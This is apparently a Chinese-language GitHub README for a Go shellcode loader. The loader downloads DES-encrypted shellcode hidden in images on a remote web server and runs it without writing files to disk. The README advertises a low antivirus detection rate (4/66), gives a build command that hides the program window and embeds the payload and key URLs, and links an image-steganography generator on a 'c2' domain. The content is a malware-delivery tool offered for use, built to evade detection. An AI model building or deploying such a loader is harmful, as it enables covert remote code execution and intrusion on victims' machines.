图片隐写的远程shellcode加载器，无文件落地版本
---
采用des加密，所以需要des加密的shellcode网址,和des的key（将隐写的图片放入web服务器）
---
vt查杀率：4/66
![avatar](https://github.com/TRYblog/shellcode-load-web/blob/main/123.png)
微步
![avatar](https://github.com/TRYblog/shellcode-load-web/blob/main/456.png)
### 如何编译
```
 go build -ldflags "-w -s -H=windowsgui -X main.deskey=deskey的网址 -X main.descode=descode的网址"
```
### 关于图片隐写
[在线生成](http://c2.57dir.com)
### 关于作者
一个菜鸟.
[个人博客](https://www.nctry.com)

2021.03.10
